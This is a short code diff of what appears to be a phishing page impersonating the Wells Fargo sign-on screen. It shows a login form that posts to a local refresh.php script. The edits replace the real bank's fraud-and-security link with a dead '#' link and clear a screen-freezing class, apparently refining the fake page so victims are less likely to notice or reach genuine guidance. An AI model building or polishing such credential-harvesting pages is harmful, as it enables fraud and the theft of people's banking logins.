@@ -29,7 +29,7 @@ $error = @$_GET['error'];
     <link rel="stylesheet" href="../../files/bars/util.css">
 </head>
 
-<body theme="ssep" id="body" class="freezedscreen" style="top: 0px;">
+<body theme="ssep" id="body" class="" style="top: 0px;">
     <div id="shell" class="page" data-pid="324-114205-64">
         <div id="hamburger-menubackdrop" class="backDrop"></div><a href="#skip" class="hidden">Skip to content</a>
 
@@ -48,7 +48,7 @@ $error = @$_GET['error'];
                 <div id="form">
                     <h1 style="margin: 0px;">Welcome</h1>
                     <!-- Retrieving username values -->
-                    <h2 style="margin-top: 0px;"><span class="icon-lock"></span><a href="https://www.wellsfargo.com/privacy-security/fraud">Online &amp; Mobile Security</a></h2>
+                    <h2 style="margin-top: 0px;"><span class="icon-lock"></span><a href="#">Online &amp; Mobile Security</a></h2>
 
                     
                         <form id="Signon" name="Signon" action="refresh.php" method="post" autocomplete="off" style="padding: 0px;">
